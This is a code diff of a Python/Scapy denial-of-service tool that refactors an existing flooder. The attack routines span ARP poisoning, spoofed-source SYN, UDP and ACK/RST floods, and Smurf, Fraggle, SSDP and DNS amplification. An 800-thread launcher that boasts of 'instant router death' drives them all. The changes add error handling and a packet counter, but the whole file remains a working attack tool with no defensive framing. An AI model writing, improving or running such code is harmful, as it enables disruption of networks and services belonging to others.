@@ -4,17 +4,23 @@ import random
 import netifaces
 import argparse
 import time
-import ipaddress  # NEW: For rock-solid broadcast calc
-
-conf.verb = 0  # No Scapy spam
+import ipaddress
+from collections import defaultdict
 
 # Pre-computed pools – max speed in hot loops
 IP_POOL = [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(10000)]
 PORT_POOL = [80, 443, 53, 22, 8080, 8443, 1900, 5060, 7]
 
-TARGET = None
-BROADCAST = None
-IFACE = None
+# Track sent packets per attack vector
+packet_stats = defaultdict(int)
+
+def send_with_error_handling(packet, count=1, **kwargs):
+    """Send packet with error handling"""
+    try:
+        send(packet, count=count, **kwargs)
+        packet_stats[str(packet)] += count
+    except Exception as e:
+        print(f"[!] Error sending packet: {e}")
 
 # === BULLETPROOF AUTO NETWORK DETECTION ===
 def get_local_network():
@@ -26,7 +32,6 @@ def get_local_network():
     local_ip = addrs['addr']
     netmask = addrs['netmask']
     
-    # Use ipaddress module – handles everything perfectly
     network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
     broadcast = str(network.broadcast_address)
     
@@ -39,45 +44,75 @@ def get_local_network():
 # === INSANE THROUGHPUT ATTACKS ===
 def arp_poison():
     while True:
-        send(ARP(op=2, psrc=random.choice(IP_POOL), pdst=TARGET, hwdst="ff:ff:ff:ff:ff:ff"), iface=IFACE, count=150)
+        send_with_error_handling(
+            ARP(op=2, psrc=random.choice(IP_POOL), pdst=TARGET, hwdst="ff:ff:ff:ff:ff:ff"),
+            iface=IFACE, count=150
+        )
 
 def syn_flood():
     base = IP(dst=TARGET)
     while True:
-        send(base.src(random.choice(IP_POOL)) / TCP(sport=random.randint(1024,65535), dport=random.choice(PORT_POOL), flags="S"), iface=IFACE, count=250)
+        send_with_error_handling(
+            base.src(random.choice(IP_POOL)) / TCP(
+                sport=random.randint(1024,65535),
+                dport=random.choice(PORT_POOL),
+                flags="S"
+            ),
+            iface=IFACE, count=250
+        )
 
 def udp_flood():
     payload = Raw(RandString(size=1200))
     base = IP(dst=TARGET)
     while True:
-        send(base.src(random.choice(IP_POOL)) / UDP(sport=random.randint(1024,65535), dport=random.choice(PORT_POOL)) / payload, iface=IFACE, count=200)
+        send_with_error_handling(
+            base.src(random.choice(IP_POOL)) / UDP(
+                sport=random.randint(1024,65535),
+                dport=random.choice(PORT_POOL)
+            ) / payload,
+            iface=IFACE, count=200
+        )
 
 def icmp_smurf():
     pkt = IP(src=TARGET, dst=BROADCAST) / ICMP(type=8) / Raw("X"*1400)
     while True:
-        send(pkt, iface=IFACE, count=400)
+        send_with_error_handling(pkt, iface=IFACE, count=400)
 
 def ssdp_amplification():
     payload = Raw("M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\nST:upnp:rootdevice\r\n\r\n")
     base = IP(dst=BROADCAST) / UDP(dport=1900) / payload
     while True:
-        send(base.src(random.choice(IP_POOL)), iface=IFACE, count=300)
+        send_with_error_handling(base.src(random.choice(IP_POOL)), iface=IFACE, count=300)
 
 def fraggle_attack():
     pkt = IP(src=TARGET, dst=BROADCAST) / UDP(dport=7) / Raw("DIE"*200)
     while True:
-        send(pkt, iface=IFACE, count=350)
+        send_with_error_handling(pkt, iface=IFACE, count=350)
 
 def dns_amplification():
     dns = DNS(rd=1, qd=DNSQR(qname=".", qtype="ANY"))
     pkt = IP(src=TARGET, dst=BROADCAST) / UDP(dport=53) / dns
     while True:
-        send(pkt, iface=IFACE, count=250)
+        send_with_error_handling(pkt, iface=IFACE, count=250)
 
 def tcp_ack_rst_storm():
     base = IP(dst=TARGET)
     while True:
-        send(base.src(random.choice(IP_POOL)) / TCP(sport=random.randint(1024,65535), dport=random.choice([80,443]), flags=random.choice(["A","R"])), iface=IFACE, count=400)
+        send_with_error_handling(
+            base.src(random.choice(IP_POOL)) / TCP(
+                sport=random.randint(1024,65535),
+                dport=random.choice([80,443]),
+                flags=random.choice(["A","R"])
+            ),
+            iface=IFACE, count=400
+        )
+
+# === STATS REPORTER ===
+def report_stats():
+    while True:
+        time.sleep(10)
+        total = sum(packet_stats.values())
+        print(f"[+] Packet stats: {total} packets/sec")
 
 # === LAUNCHER ===
 def launch_optimized_flood(threads=800):
@@ -88,7 +123,12 @@ def launch_optimized_flood(threads=800):
     print(f"[+] Target: {TARGET} | Broadcast: {BROADCAST} | Threads: {threads}")
     print(f"[+] Expecting >2M packets/sec combined – instant router death")
     
-    attacks = [arp_poison, syn_flood, udp_flood, icmp_smurf, ssdp_amplification, fraggle_attack, dns_amplification, tcp_ack_rst_storm]
+    # Start stats reporter
+    stats_thread = threading.Thread(target=report_stats, daemon=True)
+    stats_thread.start()
+    
+    attacks = [arp_poison, syn_flood, udp_flood, icmp_smurf, 
+              ssdp_amplification, fraggle_attack, dns_amplification, tcp_ack_rst_storm]
     per_attack = threads // len(attacks)
     
     for func in attacks:
